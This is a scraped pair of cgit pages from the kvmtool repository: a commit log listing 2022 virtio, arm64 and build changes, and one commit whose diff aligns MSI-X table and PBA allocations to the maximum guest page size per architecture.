| 2022-08-04 | [Makefile: Fix ARCH override](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=ae22ac7a81e5f59b8f93db6127a8797500836f60) | Jean-Philippe Brucker | 1 | -2/+2 |
| 2022-08-04 | [Makefile: Add missing build dependencies](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3863f34bd76723358b4ec7d44a12a4b6b990ceb5) | Jean-Philippe Brucker | 1 | -1/+2 |
| 2022-07-01 | [arm64: pvtime: Use correct region size](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=6a1f699108e5c2a280d7cd1f1ae4816b8250a29f) | Alexandru Elisei | 1 | -5/+5 |
| 2022-07-01 | [virtio/pci: Remove VIRTIO\_PCI\_F\_SIGNAL\_MSI](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=c86ef0b86366ce7e1320a902b2aa738166187667) | Jean-Philippe Brucker | 2 | -7/+5 |
| 2022-07-01 | [virtio/pci: Initialize all vectors to VIRTIO\_MSI\_NO\_VECTOR](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3d5cefc2eb3e2dec92bad5bf46a87251027975a2) | Jean-Philippe Brucker | 2 | -2/+4 |
| 2022-07-01 | [virtio: Add support for modern virtio-mmio](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=5fe5eb04de80b8bc68f4d57443596d0b935907ef) | Jean-Philippe Brucker | 8 | -11/+195 |
| 2022-07-01 | [virtio: Move MMIO transport to mmio-legacy](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=22a0823676f13ade6a8d561eaf45c6d4e3218059) | Jean-Philippe Brucker | 4 | -155/+165 |
| 2022-07-01 | [virtio: Add support for modern virtio-pci](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b0d56e3c994a0feb3ffb519cecda5c1f6da8b1ab) | Jean-Philippe Brucker | 15 | -19/+445 |
| 2022-07-01 | [virtio: Move PCI transport to pci-legacy](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=930876d51193a33f335dc4416999be07b0b03463) | Jean-Philippe Brucker | 4 | -236/+254 |
| 2022-07-01 | [virtio: Prepare for more feature bits](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3c8f82b8d4a7d98a9e391e5ccd22198d775bcb49) | Jean-Philippe Brucker | 10 | -14/+14 |
| 2022-07-01 | [virtio/net: Set vhost backend after queue address](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=de166e5f7edc93de3189c6848c40b39a4ac11a93) | Jean-Philippe Brucker | 1 | -5/+6 |
| 2022-07-01 | [virtio/pci: Use the correct eventfd for vhost notification](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=73fd13686e2276f9ea3b2e47bdb92c2d73752daa) | Jean-Philippe Brucker | 1 | -4/+5 |
| 2022-07-01 | [virtio/pci: Make doorbell offset dynamic](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=21c9bc7440878fd341c26a32a068e045ff188e5c) | Jean-Philippe Brucker | 2 | -5/+10 |
| 2022-07-01 | [virtio: Extract init\_vq() for PCI and MMIO](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=d0607293c937ec3f3fd1b69ef535a3a282754f9c) | Jean-Philippe Brucker | 2 | -8/+30 |
| 2022-07-01 | [virtio/pci: Delete MSI routes](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=c6590f782be68e5321d3fbd90af2ebe3dbd92550) | Jean-Philippe Brucker | 1 | -0/+14 |
| 2022-07-01 | [arm64: Allow the user to specify the RAM base address](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8b91a1828ee9d7c137cd5c7974e67687d735d472) | Alexandru Elisei | 7 | -10/+64 |
| 2022-07-01 | [Introduce kvm\_\_arch\_default\_ram\_address()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3f7e48f621bb229aad995111a20251dc027bf953) | Alexandru Elisei | 7 | -0/+31 |
| 2022-07-01 | [arm/arm64: Consolidate RAM initialization in kvm\_\_init\_ram()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=a37dad0ea9c76af03bf7bd135d5dc69563b6628b) | Julien Grall | 1 | -26/+26 |
| 2022-07-01 | [kvm\_\_arch\_init: Remove hugetlbfs\_path and ram\_size as parameters](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=5e9c654e60e85090ff365e875b2a7269d9301859) | Julien Grall | 7 | -14/+20 |
| 2022-07-01 | [builtin\_run: Allow standard size specifiers for memory](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=a9c24ec78b4fb23596fa4cb0894e2c58e9345f8b) | Suzuki K Poulose | 1 | -5/+54 |
| 2022-07-01 | [arm/arm64: Kill the ARM\_HIMAP\_MAX\_MEMORY() macro](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=d6d4220133b7624e372daa45f9761d8f15050a80) | Alexandru Elisei | 1 | -1/+0 |
| 2022-07-01 | [arm/arm64: Kill the ARM\_MAX\_MEMORY() macro](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=1af57dcdce5145bc951826a164504bd28efa7453) | Alexandru Elisei | 2 | -18/+0 |
| 2022-07-01 | [arm/arm64: Fail if RAM size is too large for 32-bit guests](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=cce5a4f6ae9b1db634245521e7967cc605e0bedc) | Alexandru Elisei | 3 | -1/+10 |
| 2022-07-01 | [builtin-run: Add arch hook to validate VM configuration](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=abe3f28a9c0700837aca75887f0cd65c6371e2e4) | Alexandru Elisei | 9 | -0/+29 |
| 2022-07-01 | [builtin-run: Rework RAM size validation](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=28b96259fbdf602178d209fe93a0eddd3eec07d8) | Alexandru Elisei | 1 | -7/+13 |
| 2022-07-01 | [builtin-run: Always use RAM size in bytes](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=9d655190e466fd6a0b042ba8107ec06570c2e6d5) | Alexandru Elisei | 3 | -13/+15 |
| 2022-07-01 | [Use MB for megabytes consistently](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=024c331b8483664853d9346d7884bf382c6745ca) | Alexandru Elisei | 2 | -3/+3 |
| 2022-07-01 | [arm: gic: fdt: fix PPI CPU mask calculation](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=d9fdaad02dfdb0ea079245218058d60270264660) | Andre Przywara | 4 | -5/+16 |
| 2022-06-09 | [virtio/pci: Factor MSI route creation](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=f44af23e3a62e46158341807b0d2d132249b96a8) | Jean-Philippe Brucker | 1 | -33/+27 |
| 2022-06-09 | [virtio/blk: Implement VIRTIO\_F\_ANY\_LAYOUT feature](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=484278913807e4e3523eff1b9933c7e86a27b6d2) | Jean-Philippe Brucker | 3 | -28/+60 |
| 2022-06-09 | [virtio/console: Add VIRTIO\_F\_ANY\_LAYOUT feature](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=e74b56e1495cce0c6a09d340c210f74266e755f8) | Jean-Philippe Brucker | 1 | -1/+1 |
| 2022-06-09 | [virtio/net: Implement VIRTIO\_F\_ANY\_LAYOUT feature](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=6daffe57762cb5863eef0441a2d40cc57cdde37b) | Jean-Philippe Brucker | 2 | -35/+57 |
| 2022-06-09 | [virtio/net: Prepare for modern virtio](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b231683c336132441496060a81726305ca56b11b) | Jean-Philippe Brucker | 3 | -7/+21 |
| 2022-06-09 | [virtio/net: Offload vnet header endianness conversion to tap](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8b27bcff44fd4adaa1466e3198e4222816eefa06) | Jean-Philippe Brucker | 1 | -20/+19 |
| 2022-06-09 | [Add memcpy\_fromiovec\_safe](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=c492534f3ac930107a628c0fadd4c152e8972b35) | Jean-Philippe Brucker | 2 | -0/+33 |
| 2022-06-09 | [virtio: Remove set\_guest\_features() device op](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=902a8ecb3877d383cc601571611690050fed9e48) | Jean-Philippe Brucker | 11 | -69/+2 |
| 2022-06-09 | [virtio/console: Remove unused callback](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=17ad9fd6ce3738df375f2480a91074f9ebf47380) | Jean-Philippe Brucker | 1 | -5/+0 |
| 2022-06-09 | [virtio: Fix device-specific config endianness](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=867b15ccd7dae9ba7a174f97d4fe76e90a79d957) | Jean-Philippe Brucker | 10 | -63/+84 |
| 2022-06-09 | [virtio: Add config access helpers](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=15e6c4e74d06f574a91c4de5eed5ec2882f0e366) | Jean-Philippe Brucker | 4 | -65/+47 |
| 2022-06-09 | [virtio: Support modern virtqueue addresses](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=609ee9066879f2ff7138c825588a4bc5d2f83658) | Jean-Philippe Brucker | 12 | -53/+86 |
| 2022-06-09 | [virtio: Factor virtqueue initialization](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=fd41cde0661755344bdfd99f2a361abd5666d7e8) | Jean-Philippe Brucker | 10 | -59/+34 |
| 2022-06-09 | [virtio/vsock: Remove redundant state tracking](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=a8e397bb9dd9ab651eaa43cb3b5293928f172d12) | Jean-Philippe Brucker | 1 | -5/+5 |
| 2022-06-09 | [virtio: Remove redundant test](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3a1e36e4bf499c5c98425f8a3f6c3df580404983) | Jean-Philippe Brucker | 1 | -2/+1 |
| 2022-06-09 | [virtio: Add NEEDS\_RESET to the status mask](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=7efc2622d5eee02f2423c81109b49644f2181d71) | Jean-Philippe Brucker | 1 | -0/+1 |
| 2022-05-26 | [riscv: Add missing asm/kernel.h header](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b4531b2c4d3f216bbc5d2fa70510f71826e6ec5d) | Dao Lu | 1 | -0/+8 |
| 2022-05-26 | [mips: Do not emulate a serial device](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=6f6f384cef27372b746158951c5ba011ca914acd) | Alexandru Elisei | 2 | -2/+10 |
| 2022-05-26 | [arm64: Honor --vcpu-affinity for aarch32 guests](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8ec1e8bf3bc2e99518d857a5164218d513d585ea) | Alexandru Elisei | 1 | -10/+12 |
| 2022-05-26 | [include: add new virtio uapi header files](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=1a992bbaab08994e12a7594b0c39535152093a6b) | Andre Przywara | 8 | -0/+1005 |
| 2022-05-26 | [include: update virtio UAPI headers](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=e5390783db61ed6df9566070327e40043afd0859) | Andre Przywara | 4 | -92/+305 |
| 2022-05-26 | [util: include virtio UAPI headers in sync](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=393e2187cf68a14e107f9fa75b1da4f5632b379b) | Andre Przywara | 1 | -0/+10 |
| 2022-05-26 | [update virtio\_mmio.h](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=7e2209945bb59e62c116cca6c371e9c3a4b99460) | Andre Przywara | 2 | -11/+52 |
| 2022-05-20 | [kvmtool: Have stack be not executable on x86](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=a68a52cd8ab76483b3592ddc0f7dbf40b4bd55ba) | Martin Radev | 2 | -0/+10 |
| 2022-05-20 | [virtio: Check for overflows in QUEUE\_NOTIFY and QUEUE\_SEL](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=31e0eacca520f60ac02dfaaaeaeddfcc132095c0) | Martin Radev | 11 | -12/+39 |
| 2022-05-20 | [virtio: Sanitize config accesses](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=e47302846cc538386c6cb62e41da485876f8bed0) | Martin Radev | 12 | -9/+119 |
| 2022-05-20 | [virtio/9p: Fix virtio\_9p\_config allocation size](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3510a7f7b45fbb9205cfb721c756b385d66e2d9d) | Martin Radev | 1 | -1/+1 |
| 2022-05-20 | [virtio: Use u32 instead of int in pci\_data\_in/out](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=06e1e6fe2e11a9b0d273e2d4e5b4f31e2f37a923) | Martin Radev | 1 | -4/+4 |
| 2022-05-20 | [mmio: Sanitize addr and len](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=52d4ee7cb52071f6ca5cdd0c9e504c4f0fefcc35) | Martin Radev | 1 | -0/+4 |
| 2022-05-20 | [kvmtool: Add WARN\_ONCE macro](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=143ffa2221d38b9405ce89552363b76cf3f6915c) | Martin Radev | 1 | -0/+10 |
| 2022-05-20 | [stat: Add descriptions for new virtio\_balloon stat types](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=bc77bf49df6e1e4ff095558cceb718293dd5b763) | Keir Fraser | 1 | -1/+16 |
| 2022-05-20 | [virtio/balloon: Fix a crash when collecting stats](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3a13530ae99acead2174b4bc3ba76a768802fd98) | Keir Fraser | 1 | -1/+6 |
| 2022-05-20 | [aarch64: Give up with MTE for AArch32 guest](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=324cc0969b7caefb98ceb411b5ffe2e8bd6f5198) | Vladimir Murzin | 1 | -0/+5 |
| 2022-05-06 | [arm64: Add --vcpu-affinity command line argument](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=4639b72f61a3d4ca48a2af1b0510584d633b8de1) | Alexandru Elisei | 7 | -22/+118 |
| 2022-05-06 | [arm64: Add support for KVM\_ARM\_VCPU\_PMU\_V3\_SET\_PMU](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=1393bda01407d85a0b4c923a4b1bf2e33ce8b846) | Alexandru Elisei | 2 | -3/+148 |
| 2022-05-06 | [update\_headers.sh: Sync ABI headers with Linux v5.18-rc2](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=083a976e0f08e052a577560c64bd13a0fc79aa89) | Alexandru Elisei | 2 | -2/+24 |
| 2022-05-06 | [Add cpumask functions](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=0febaae00bb6f8c5e694f87d6354fbcbe81e6653) | Alexandru Elisei | 14 | -0/+517 |
| 2022-05-06 | [arm64: Rework set\_pmu\_attr()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=83713e75cd6563db10cdd9881636740eace02770) | Alexandru Elisei | 1 | -32/+16 |
| 2022-05-06 | [arm: Make the PMUv3 emulation code arm64 specific](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=f57ce447709232e07e996968bd2df3e5395129a3) | Alexandru Elisei | 4 | -12/+10 |
| 2022-05-06 | [arm: Get rid of the ARM\_VCPU\_FEATURE\_FLAGS() macro](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b23aed2ae11e8c0a03c53d7e8e63ad1b22e5db1f) | Alexandru Elisei | 3 | -9/+5 |
| 2022-05-06 | [arm: Move arch specific VCPU features to the arch specific function](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=412ee1375de8fcfae2feece5db9c859eedb3cdba) | Alexandru Elisei | 3 | -11/+13 |
| 2022-05-06 | [arm/arm64: pmu.h: Add missing header guards](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=5898515dc727c8fa595a25dac640202bec2440eb) | Alexandru Elisei | 1 | -0/+4 |
| 2022-05-06 | [linux/bitops.h: Include wordsize.h to provide the \_\_WORDSIZE define](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=d9b64eb6aa05e552d6c9abf26ae9d87d9fb9c4ed) | Alexandru Elisei | 1 | -0/+2 |
| 2022-05-06 | [linux/err.h: Add missing stdbool.h include](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=443cd881b47126bde6f442abc1f6c76998d713b7) | Alexandru Elisei | 1 | -0/+2 |
| 2022-04-04 | [aarch64: Add support for MTE](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=5657dd3e48b41bc6db38fa657994bc0e030fd31f) | Alexandru Elisei | 6 | -0/+31 |
| 2022-04-04 | [update\_headers.sh: Sync ABI headers with Linux v5.17](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=af1b793cb61656b0fac0fdf4fe4b5e0518a5599f) | Alexandru Elisei | 3 | -1/+41 |

* [[next]](/pub/scm/linux/kernel/git/will/kvmtool.git/log/?ofs=200)

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-14 21:55:05 +0000



=== Content from git.kernel.org_069aedef_20250114_215627.html ===


| [cgit logo](/) | [index](/) : [kernel/git/will/kvmtool.git](/pub/scm/linux/kernel/git/will/kvmtool.git/) | master |
| --- | --- | --- |
| Stand-alone kvmtool | Will Deacon |

| [about](/pub/scm/linux/kernel/git/will/kvmtool.git/about/)[summary](/pub/scm/linux/kernel/git/will/kvmtool.git/)[refs](/pub/scm/linux/kernel/git/will/kvmtool.git/refs/?id=39181fc6429f4e9e71473284940e35857b42772a)[log](/pub/scm/linux/kernel/git/will/kvmtool.git/log/)[tree](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/?id=39181fc6429f4e9e71473284940e35857b42772a)[commit](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=39181fc6429f4e9e71473284940e35857b42772a)[diff](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/?id=39181fc6429f4e9e71473284940e35857b42772a)[stats](/pub/scm/linux/kernel/git/will/kvmtool.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Alexandru Elisei <alexandru.elisei@arm.com> | 2021-10-12 14:25:10 +0100 |
| --- | --- | --- |
| committer | Will Deacon <will@kernel.org> | 2021-10-13 08:36:59 +0100 |
| commit | [39181fc6429f4e9e71473284940e35857b42772a](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=39181fc6429f4e9e71473284940e35857b42772a) ([patch](/pub/scm/linux/kernel/git/will/kvmtool.git/patch/?id=39181fc6429f4e9e71473284940e35857b42772a)) | |
| tree | [cfb5316ffa5e1411b44f7565a9aad4db67af48df](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/?id=39181fc6429f4e9e71473284940e35857b42772a) | |
| parent | [b20d6e3029400b4b4b19c654192951f8bedd39cc](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b20d6e3029400b4b4b19c654192951f8bedd39cc) ([diff](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/?id=39181fc6429f4e9e71473284940e35857b42772a&id2=b20d6e3029400b4b4b19c654192951f8bedd39cc)) | |
| download | [kvmtool-39181fc6429f4e9e71473284940e35857b42772a.tar.gz](/pub/scm/linux/kernel/git/will/kvmtool.git/snapshot/kvmtool-39181fc6429f4e9e71473284940e35857b42772a.tar.gz) | |

vfio/pci: Align MSIX Table and PBA size to guest maximum page sizeWhen allocating MMIO space for the MSI-X table, kvmtool rounds the
allocation to the host's page size to make it as easy as possible for the
guest to map the table to a page, if it wants to (and doesn't do BAR
reassignment, like the x86 architecture for example). However, the host's
page size can differ from the guest's on architectures which support
multiple page sizes. For example, arm64 supports three different page size,
and it is possible for the host to be using 4k pages, while the guest is
using 64k pages.
To make sure the allocation is always aligned to a guest's page size, round
it up to the maximum architectural page size. Do the same for the pending
bit array if it lives in its own BAR.
Signed-off-by: Alexandru Elisei <alexandru.elisei@arm.com>
Reviewed-by: Andre Przywara <andre.przywara@arm.com>
Link: [https://lore.kernel.org/r/20211012132510.42134-8-alexandru.elisei@arm.com](https://lore.kernel.org/r/20211012132510.42134-8-alexandru.elisei%40arm.com)
Signed-off-by: Will Deacon <will@kernel.org>
[Diffstat](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/?id=39181fc6429f4e9e71473284940e35857b42772a)

| -rw-r--r-- | [arm/aarch32/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/arm/aarch32/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a) | 4 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |
| -rw-r--r-- | [arm/aarch64/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/arm/aarch64/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a) | 4 | |  |  |  | | --- | --- | --- | |
| -rw-r--r-- | [mips/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/mips/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a) | 3 | |  |  |  | | --- | --- | --- | |
| -rw-r--r-- | [powerpc/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/powerpc/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a) | 3 | |  |  |  | | --- | --- | --- | |
| -rw-r--r-- | [vfio/pci.c](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/vfio/pci.c?id=39181fc6429f4e9e71473284940e35857b42772a) | 6 | |  |  |  | | --- | --- | --- | |
| -rw-r--r-- | [x86/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/x86/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a) | 3 | |  |  |  | | --- | --- | --- | |

6 files changed, 21 insertions, 2 deletions

| diff --git a/arm/aarch32/include/kvm/kvm-arch.h b/arm/aarch32/include/kvm/kvm-arch.hindex a772bb1d..bee2fc25 100644--- a/[arm/aarch32/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/arm/aarch32/include/kvm/kvm-arch.h?id=b20d6e3029400b4b4b19c654192951f8bedd39cc)+++ b/[arm/aarch32/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/arm/aarch32/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a)@@ -1,10 +1,14 @@ #ifndef KVM\_\_KVM\_ARCH\_H #define KVM\_\_KVM\_ARCH\_H +#include <linux/sizes.h>+ #define kvm\_\_arch\_get\_kern\_offset(...) 0x8000  #define ARM\_MAX\_MEMORY(...) ARM\_LOMAP\_MAX\_MEMORY +#define MAX\_PAGE\_SIZE SZ\_4K+ #include "arm-common/kvm-arch.h"  #endif /\* KVM\_\_KVM\_ARCH\_H \*/diff --git a/arm/aarch64/include/kvm/kvm-arch.h b/arm/aarch64/include/kvm/kvm-arch.hindex 159567b9..5e5ee412 100644--- a/[arm/aarch64/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/arm/aarch64/include/kvm/kvm-arch.h?id=b20d6e3029400b4b4b19c654192951f8bedd39cc)+++ b/[arm/aarch64/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/arm/aarch64/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a)@@ -1,6 +1,8 @@ #ifndef KVM\_\_KVM\_ARCH\_H #define KVM\_\_KVM\_ARCH\_H +#include <linux/sizes.h>+ struct kvm; unsigned long long kvm\_\_arch\_get\_kern\_offset(struct kvm \*kvm, int fd); int kvm\_\_arch\_get\_ipa\_limit(struct kvm \*kvm);@@ -21,6 +23,8 @@ int kvm\_\_arch\_get\_ipa\_limit(struct kvm \*kvm); max\_ram; \ }) +#define MAX\_PAGE\_SIZE SZ\_64K+ #include "arm-common/kvm-arch.h"  #endif /\* KVM\_\_KVM\_ARCH\_H \*/diff --git a/mips/include/kvm/kvm-arch.h b/mips/include/kvm/kvm-arch.hindex fdc09d83..e2f048a0 100644--- a/[mips/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/mips/include/kvm/kvm-arch.h?id=b20d6e3029400b4b4b19c654192951f8bedd39cc)+++ b/[mips/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/mips/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a)@@ -1,6 +1,7 @@ #ifndef KVM\_\_KVM\_ARCH\_H #define KVM\_\_KVM\_ARCH\_H +#include <linux/sizes.h>  /\* \* Guest memory map is:@@ -36,6 +37,8 @@  #define VIRTIO\_DEFAULT\_TRANS(kvm) VIRTIO\_PCI +#define MAX\_PAGE\_SIZE SZ\_64K+ #include <stdbool.h>  #include "linux/types.h"diff --git a/powerpc/include/kvm/kvm-arch.h b/powerpc/include/kvm/kvm-arch.hindex 26d440b2..8eeca507 100644--- a/[powerpc/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/powerpc/include/kvm/kvm-arch.h?id=b20d6e3029400b4b4b19c654192951f8bedd39cc)+++ b/[powerpc/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/powerpc/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a)@@ -13,6 +13,7 @@  #include <stdbool.h> #include <linux/types.h>+#include <linux/sizes.h> #include <time.h>  /\*@@ -48,6 +49,8 @@  #define KVM\_IOEVENTFD\_HAS\_PIO 0 +#define MAX\_PAGE\_SIZE SZ\_256K+ #define VIRTIO\_DEFAULT\_TRANS(kvm) VIRTIO\_PCI  struct spapr\_phb;diff --git a/vfio/pci.c b/vfio/pci.cindex a08352d8..78f5ca5e 100644--- a/[vfio/pci.c](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/vfio/pci.c?id=b20d6e3029400b4b4b19c654192951f8bedd39cc)+++ b/[vfio/pci.c](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/vfio/pci.c?id=39181fc6429f4e9e71473284940e35857b42772a)@@ -1,3 +1,5 @@+#include "linux/sizes.h"+ #include "kvm/irq.h" #include "kvm/kvm.h" #include "kvm/kvm-cpu.h"@@ -926,7 +928,7 @@ static int vfio\_pci\_create\_msix\_table(struct kvm \*kvm, struct vfio\_device \*vdev) if (!info.size) return -EINVAL; - map\_size = ALIGN(info.size, PAGE\_SIZE);+ map\_size = ALIGN(info.size, MAX\_PAGE\_SIZE); table->guest\_phys\_addr = pci\_get\_mmio\_block(map\_size); if (!table->guest\_phys\_addr) { pr\_err("cannot allocate MMIO space");@@ -958,7 +960,7 @@ static int vfio\_pci\_create\_msix\_table(struct kvm \*kvm, struct vfio\_device \*vdev) if (!info.size) return -EINVAL; - map\_size = ALIGN(info.size, PAGE\_SIZE);+ map\_size = ALIGN(info.size, MAX\_PAGE\_SIZE); pba->guest\_phys\_addr = pci\_get\_mmio\_block(map\_size); if (!pba->guest\_phys\_addr) { pr\_err("cannot allocate MMIO space");diff --git a/x86/include/kvm/kvm-arch.h b/x86/include/kvm/kvm-arch.hindex 85cd336c..d8a7312d 100644--- a/[x86/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/x86/include/kvm/kvm-arch.h?id=b20d6e3029400b4b4b19c654192951f8bedd39cc)+++ b/[x86/include/kvm/kvm-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/x86/include/kvm/kvm-arch.h?id=39181fc6429f4e9e71473284940e35857b42772a)@@ -5,6 +5,7 @@  #include <stdbool.h> #include <linux/types.h>+#include <linux/sizes.h> #include <time.h>  /\*@@ -30,6 +31,8 @@  #define KVM\_IOEVENTFD\_HAS\_PIO 1 +#define MAX\_PAGE\_SIZE SZ\_4K+ #define VIRTIO\_DEFAULT\_TRANS(kvm) VIRTIO\_PCI  struct kvm\_arch { |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-14 21:55:04 +0000


